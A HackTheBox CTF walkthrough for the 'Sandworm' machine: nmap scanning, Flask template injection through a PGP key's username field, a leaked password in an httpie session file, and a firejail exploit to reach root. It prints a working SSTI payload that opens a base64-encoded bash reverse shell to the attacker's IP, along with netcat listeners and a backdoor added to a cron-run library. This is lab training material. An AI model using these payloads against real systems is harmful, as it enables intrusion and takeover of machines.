  <h2> Target: Sandworm 10.10.11.218</h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.10.11.218 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap shows open ports: 22, 80, 443

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.10.11.218 --min-rate=5000 -p 22,80,443 -sC -sV -oN nmap-sandworm 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/fd0d75b2-7411-4bf6-b67e-73d303211d46) 

Step 3: Nmap shows a redirect to https://ssa.htb.  To enable this redirect enter this into the file /etc/hosts: 10.10.11.218 ssa.htb

Step 4: Navigating to port 80 shows: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/93415648-5339-4a3d-bc4c-ab95ac7bdea3) 

Click on ‘Contact’ (top right of the page).  After clicking on ‘Contact’, the page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/87b2aed8-87a3-441f-836a-6e800b8e93d4)
 
We see the bottom of the page shows that the website is using ‘Flask’.   

Step 5: Click on ‘guide’ (bottom of the page, right above the ‘Submit’ button).  After clicking on ‘guide’ the page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ce592f4b-d284-4cff-ae3a-b1912598f072) 
 
This page has a few different functions for using PGP.  

Step 6: Go to the 3rd input box where it has a function to ‘Verify Signature’.  The first box (the one on the left hand side) requires us to put in a pgp public key of our own.  To do this, first we will create pgp public and private keys using command: gpg --gen-key  

When generating the pgp keys it will ask us to enter a name.  We will use the name ‘MrAnderson’.  

Next, find the pgp public key we just created: gpg --verbose --armor --export MrAnderson
Enter the public key in the input box provided on the left hand side:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/074b1b6d-2579-4392-85cf-c93f3c3705f5) 

Step 7: The column on the right hand side requires a pgp signed message.  First, create a file called ‘test’ containing any text.  Next, to create a pgp signed message we will sign this file ‘test’ with our pgp public key: gpg --verbose -u MrAnderson --clear-sign test 
 
Enter the pgp signed message we created in the column on the right hand side: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/cad44266-3ccc-4734-a1fd-65340001d0db)

Step 8: Clicking on ‘Verify Signature’ shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/1391cff4-df76-4009-996b-9b189f122428) 

This shows our signature is valid, but more importantly we see it reflects our username ‘MrAnderson’ in the message.  

Step 9: Since the site is reflecting our input, let’s test for server side template injection.  We saw earlier that the page is using ‘Flask’ so we can try a simple payload for ‘Flask’ of {{7*7}}.  If vulnerable, it should run the multiplication of 7*7 and output 49.  

Repeat the steps we performed above for using ‘Verify Signature’ on the site.  Except this time, when creating the pgp keys choose a username of {{7*7}}.

Step 10: After putting in the proper values in both columns, click on ‘Verify Signature’.  The page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/19772986-a2ce-4db0-8e10-9f3a8559ed5c)

The page is vulnerable to ssti, it returned 49 as our username.  

Step 11: Repeat the steps we performed above for using ‘Verify Signature’ on the site.  Except this time, when creating the pgp keys, make our username a flask reverse shell (google flask reverse shell): {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODAvNDQzIDA+JjEK | base64 -d | bash').read() }}

** Make sure to edit the base64 part in the payload as that will be different for you.  The reason we have to base64 encode our payload inside of ‘popen’ is because certain characters are not allowed for the username for the pgp keys: base64 -w0 <<< "bash -i >& /dev/tcp/\<enter-your-ip-here\>/443 0>&1"

Step 12: Open a netcat listener to catch the reverse shell: rlwrap nc -lvnp 443

Step 13: Click on ‘Verify Signature’.  We have shell as user ‘atlas’.
_______________________________________________________________
<b>Lateral Movement:</b><br>
Step 1: The ‘/home’ directory shows a username of ‘silentobserver’.  Checking ‘/etc/passwd’ confirms there’s a user by the name of ‘silentobserver’.  

Step 2: Read the file /home/atlas/.config/httpie/sessions/localhost_5000/admin.json: cat admin.json

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e5102850-13db-4a78-b7c4-565cc6c44954)   

The file shows credentials: username ‘silentobserver’ and password ‘quietLiketheWind22’

Step 3: ssh silentobserver@ssa.htb → enter the password when prompted

We have shell as user silentobserver.  We can get the flag in /home/silentobserver/user.txt
____________________________________________________________
<b>Lateral Movement:</b><br>
Step 1: Use pspy to check for interesting background processes that may be running.  Upload pspy to the target shell.  Run pspy: ./pspy

Pspy shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/62136ecf-3c24-42f9-92ac-d547dac1986c)

Step 2: The file ‘/opt/crates/logger/src/lib.rs’ shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/cbb19b29-50d9-4de9-a7f0-8e83c5f6051a)
 
Step 3: Add into this code a command for a reverse shell (highlighted in screenshot below):    

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/009f35c4-c6c2-42b8-b051-e5c51c946079)
 
When the background process runs we will get a reverse shell as user atlas.  (Even though we had a shell as user atlas before, the shell was very limited and didn’t allow us to upgrade the shell.  The privilege escalation would not work with the limited shell we had before.)  

Step 4: Open a netcat lister to catch the reverse shell: nc -lvnp 443

Step 5: Wait a few seconds and we will get a reverse shell on our netcat listener as user atlas.   
__________________________
<b>Privilege Escalation</b><br>
Step 1:  Check user and group id: id 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8e216bbe-6e24-4b15-b86c-5accc72a633d)

This shows our user belongs to a group called ‘jailer’.

Step 2: Check what files and directories belong to the ‘jailer’ group: find / - group jailer -ls 2>/dev/null

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0d6f4264-746d-4a8d-8bce-b0a61bc7452f)

There is one file belonging to the group ‘jailer’ and it has suid permissions.  

Step 3: Check if there are any known exploits for ‘firejail’.  A quick google search shows that 'firejail' has known exploits:  

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/57df040d-6cdd-460e-83e5-72bc736ee0b6)

Step 4: In order to know which exploit for firejail we should focus on we will check what version of firejail the target is using: /usr/local/bin/firejail --version

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5b2a95c5-a899-470a-95b9-59d4fe623156)
 
Step 5: Firejail version 0.9.68 is vulnerable.  For this exploit we will need a second ‘atlas’ shell.  A simple way to get a second shell is to use ssh keys.  

A. On the target shell, create public and private ssh keys: ssh-keygen

B. On the target shell, copy the ssh public key to ‘authorized_keys’: cp id_rsa.pub authroized_keys

C. Download the private ssh key ‘id_rsa’ to our pc.

D. On our pc, change the downloaded ‘id_rsa’ permissions: chmod 600 id_rsa

E. From our pc, login with ssh using the private ssh key: ssh -i id_rsa atlas@ssa.htb
 
Step 6: Download the exploit ‘firejoin.py’ from https://www.openwall.com/lists/oss-security/2022/06/08/10  
 
Step 7: Upload the exploit to the target shell.  

Step 8: Give ‘firejoin.py’ execute permissions: chmod +x firejoin.py

Step 9: Run the exploit: python3 firejoin.py 


![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4aec31db-1b37-4393-b346-a8156095cba1)
  
After running the exploit, the output tells us that the next step is to run ‘firejail –join=385008 in another terminal and to then run su.  

Step 10: Go to the other target shell we have as user atlas and run: firejail --join=385008
 
Next, run the command ‘su’:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9f3a0f2f-b915-4fad-8360-d69e055d8034)
 
We have shell as root.  We can get the flag in /root/root.txt.

